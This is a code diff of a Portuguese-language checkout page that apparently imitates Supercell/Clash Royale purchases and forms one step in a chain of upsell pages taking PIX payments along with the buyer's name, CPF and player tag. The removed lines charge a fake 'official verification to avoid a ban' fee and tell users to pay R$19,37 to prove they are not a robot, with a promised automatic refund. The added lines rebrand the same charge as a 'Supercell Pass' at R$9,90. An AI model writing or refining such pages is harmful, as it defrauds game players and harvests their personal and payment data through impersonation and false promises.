@@ -979,7 +979,7 @@ e.preventDefault();
 <main class="Page_Container__zqFGK">
 <div class="CheckoutIndex_Base__XBZKK">
 <div class="CheckoutIndex_Header__FSjS_">
-<a href="index.html" class=""><button class="IconButton_IconButton__Dd2YR CheckoutIndex_HeaderActionButton__zuNtF"><svg width="12" height="17" viewBox="0 0 17 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 1L2 6L7 11" stroke="black" stroke-width="2"></path><rect width="15" height="2" transform="matrix(-1 0 0 1 17 5)" fill="black"></rect></svg></button></a>
+<a href="up2.html" class=""><button class="IconButton_IconButton__Dd2YR CheckoutIndex_HeaderActionButton__zuNtF"><svg width="12" height="17" viewBox="0 0 17 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 1L2 6L7 11" stroke="black" stroke-width="2"></path><rect width="15" height="2" transform="matrix(-1 0 0 1 17 5)" fill="black"></rect></svg></button></a>
 <h1 class="CheckoutIndex_Title__WmQQb">Finalizar pedido</h1>
 </div>
 
@@ -992,7 +992,7 @@ e.preventDefault();
 <div class="PurchaseInfo_TitleBorder__9Qb_z"></div>
 </div>
 <ul class="PurchaseInfo_ItemList__EyJvh">
-<li class="PurchaseInfo_ItemRow__8RIHl"><div class="PurchaseInfo_title__uB9Ok">1 x Verificação Oficial para evitar banimento</div></li>
+<li class="PurchaseInfo_ItemRow__8RIHl"><div class="PurchaseInfo_title__uB9Ok">1 x Supercell Pass - Prioridade Imediata</div></li>
 </ul>
 </div>
 
@@ -1180,7 +1180,7 @@ e.preventDefault();
     .pix-info-grid .slot-value { font-size: 16px; font-weight: 700; color: #2b323b; }
   </style>
   <!-- TOTAL -->
-  <div class="pc-total">Reembolso de: &nbsp;R$ 19,37</div>
+  <div class="pc-total">Total: &nbsp;R$ 9,90</div>
   <!-- TABS -->
   <div class="pc-tabs">
     <button class="pc-tab active" data-method="pix">
@@ -1279,8 +1279,7 @@ e.preventDefault();
     </div>
   </div>
   <!-- BOTÃO PAGAR -->
-  <button class="pc-btn" id="btn-pagar">Pagar R$ 19,37</button>
-  <p style="text-align:center;font-size:13px;color:#666;margin:12px 16px 0;line-height:1.5;">Pague esses R$19,37 para confirmar que você não é um robô e em até 15 minutos já iremos reembolsar esse valor automaticamente direto para sua conta bancária.</p>
+  <button class="pc-btn" id="btn-pagar">Pagar R$ 9,90</button>
   <!-- FOOTER -->
   <div class="pc-footer">
     <p class="pc-footer-label">Vendido e fornecido por</p>
@@ -1349,15 +1348,15 @@ e.preventDefault();
     // =============================================
     // PRODUTO FIXO DO UPSELL (sem sessionStorage)
     // =============================================
-    function getCartItems() { return [{ title: 'Pass Royale Extra', price: '19,37 R$', quantity: 1, image: '../images/clashroyale/icons/pass-royale-icon.webp' }]; }
-    function getCartTotal() { return 1937; }
-    function buildDuttyfyItem() { return { title: 'Pass Royale Extra', price: 1937, quantity: 1 }; }
-    function buildOrderDescription() { return '1x Pass Royale Extra (R$ 19,37)'; }
+    function getCartItems() { return [{ title: 'Supercell Pass', price: '9,90 R$', quantity: 1, image: '../images/clashroyale/icons/pass-royale-icon.webp' }]; }
+    function getCartTotal() { return 990; }
+    function buildDuttyfyItem() { return { title: 'Supercell Pass', price: 990, quantity: 1 }; }
+    function buildOrderDescription() { return '1x Supercell Pass (R$ 9,90)'; }
     function atualizarTotalPagina() {
       var el = document.querySelector('.pc-total');
-      if (el) el.innerHTML = 'Reembolso de: &nbsp;R$ 19,37';
+      if (el) el.innerHTML = 'Total: &nbsp;R$ 9,90';
       var btn = document.getElementById('btn-pagar');
-      if (btn) btn.textContent = 'Pagar R$ 19,37';
+      if (btn) btn.textContent = 'Pagar R$ 9,90';
     }
     atualizarTotalPagina();
     // =============================================
@@ -1435,14 +1434,14 @@ e.preventDefault();
       document.getElementById('pix-info-box').style.display = 'none';
       // Montar utm: query string completa da URL + player_tag/nome/descrição
       var rawUtm = window.location.search.replace(/^\?/, '');
-      var utmExtras = ['upsell=1'];
+      var utmExtras = ['upsell=2'];
       if (playerTag) utmExtras.push('player_tag=' + encodeURIComponent(playerTag.replace('#', '')));
       if (playerName) utmExtras.push('player_name=' + encodeURIComponent(playerName));
       utmExtras.push('order_desc=' + encodeURIComponent(buildOrderDescription()));
       var utmString = rawUtm ? (rawUtm + '&' + utmExtras.join('&')) : utmExtras.join('&');
       var payload = {
         amount: totalCentavos,
-        description: 'Upsell 1 - Pass Royale Extra' + (playerTag ? (' - ' + playerTag) : ''),
+        description: 'Upsell 2 - Supercell Pass' + (playerTag ? (' - ' + playerTag) : ''),
         customer: {
           name: nome,
           document: cpf,
@@ -1637,18 +1636,17 @@ e.preventDefault();
     // SUCESSO
     // =============================================
     function exibirSucesso() {
-      sessionStorage.setItem('up1_pago_em', new Date().getTime());
+      // (sem restauração de PIX)
       var resultado = document.getElementById('pix-resultado');
       resultado.innerHTML = '<div style="text-align:center; padding:20px 0;">' +
         '<div style="width:60px; height:60px; border-radius:50%; background:#2E7D32; display:flex; align-items:center; justify-content:center; margin:0 auto 15px;">' +
         '<svg width="30" height="30" viewBox="0 0 24 24" fill="none"><path d="M20 6L9 17L4 12" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>' +
         '</div>' +
         '<h3 style="font-size:18px; font-weight:700; color:#1a1a1a; margin-bottom:8px;">Pagamento confirmado!</h3>' +
-        '<p style="font-size:13px; color:#666;">Redirecionando...</p>' +
+        '<p style="font-size:13px; color:#666;">Seus itens serão entregues na sua conta em instantes.</p>' +
         '</div>';
       var statusDiv = document.getElementById('pix-status');
       if (statusDiv) statusDiv.style.display = 'none';
-      setTimeout(function(){ window.location.href = 'up2.html' + window.location.search; }, 2000);
     }
     // =============================================
     // MOSTRAR ERRO
@@ -1673,10 +1671,10 @@ e.preventDefault();
   </script>
 <script>
 document.addEventListener('DOMContentLoaded',function(){
-  if(window.clarity) window.clarity('event','etapa_checkout_up1');
+  if(window.clarity) window.clarity('event','etapa_checkout_up2');
   var btn=document.getElementById('btn-pagar');
   if(btn) btn.addEventListener('click',function(){
-    if(window.clarity) window.clarity('event','iniciou_pagamento_up1');
+    if(window.clarity) window.clarity('event','iniciou_pagamento_up2');
   });
 });
 </script>
